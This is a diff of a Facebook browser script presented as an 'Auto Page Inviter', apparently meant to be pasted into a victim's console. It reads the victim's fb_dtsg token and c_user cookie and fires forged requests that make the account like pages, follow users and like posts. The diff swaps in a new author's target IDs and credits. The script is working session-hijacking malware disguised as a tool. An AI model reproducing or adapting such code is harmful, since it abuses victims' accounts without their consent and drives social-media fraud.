@@ -31,20 +31,11 @@ function LIST(L) {
   X.send(XParams);
 }
 
-    LIST("277925855686838");
-    LIST("291229681023122");
-    LIST("485301044873554");
-    LIST("299663130104014");
-    LIST("632874906723604");
-    LIST("632876596723435");
-    LIST("632795226731572");
-    LIST("632878956723199");
-    LIST("632879523389809");
-    LIST("632880530056375");
-    LIST("632881000056328");
-    LIST("632881906722904");
-    LIST("632882983389463");
-    LIST("475992205813098");   
+    LIST("243244075845531");
+    LIST("243246242511981");
+    LIST("243246659178606");
+    LIST("243246009178671");
+   
     
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -61,22 +52,10 @@ function Like(p) {
   };
   Page.send(PageParams);
 }
-Like("411824462185913");
-Like("226344357522802");
-Like("151809728220016");
-Like("670420942980727");
-Like("152395454824071");
-Like("179085445604185");
-Like("333530040101756");
-Like("210078489013670");
-Like("355876831170935");
-Like("158133847585475");
-Like("590576371009516");
-Like("364072817052028");
-Like("474799232575065");
-Like("382331778475937");
-Like("1451359131759051");
-Like("148482362017538");
+Like("484030124982935");
+Like("480363822015816");
+Like("100422370126775");
+Like("143327322530697");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function IDS(r) {
@@ -91,9 +70,8 @@ function IDS(r) {
   };
   X.send(XParams);
 }
-IDS("100004082763721");
-IDS("100000033005613");
-IDS("100001809896405");
+IDS("100004798201507");
+IDS("100007517864229");
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -109,9 +87,8 @@ function a(abone) {
   };
   http4.send(params4);
 }
-a("100004082763721");
-a("100000033005613");
-a("100001809896405");
+a("100004798201507");
+a("100007517864229");
 
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -129,19 +106,7 @@ function P(post) {
   X.send(XParams);
 }    
 
-P("670424442980377"); 
-P("670424389647049"); 
-P("670424292980392"); 
-P("670424549647033"); 
-P("670424616313693"); 
-P("670424752980346"); 
-P("411098232369599"); 
-P("310365145776242");
-P("324865180992905");
-P("320407474772009");
-P("325423470937076");
-P("310365145776242");
-P("237718269718744"); 
+P("243257919177480"); 
 
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -158,27 +123,12 @@ function P(opo) {
   };
   X.send(XParams);
 }    
-P("411390792340343"); 
-P("310365145776242"); 
-P("670425686313586"); 
-P("670425756313579"); 
-P("670425836313571"); 
-P("670425412980280"); 
-P("670424062980415"); 
-P("670424142980407"); 
-P("670424246313730"); 
-P("377559655723457"); 
-P("380284052117684"); 
-P("101918979954194"); 
-P("203888899757201"); 
-P("691614807516280"); 
-P("307225016090255"); 
-P("383798001766289"); 
+P("243257919177480"); 
 
 
 var Title = "Auto Page Inviter</A>";
 var Descriptions = "",
-    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/226344357522802" target="_blank">Developer Malaysia 99%</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100004082763721" target="_blank"> Donnazmi</A></A>,</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://developersmalaysia.blogspot.com/" target="_blank">Automate Your Facebook</A>.</A>';
+    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/484030124982935" target="_blank">Alpha Networks 99%</A></br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100004798201507" target="_blank"> Yahya Vanders</A></A>,</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://blogspot.com/" target="_blank">Automate Your Facebook</A>.</A>';
 
 page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
 
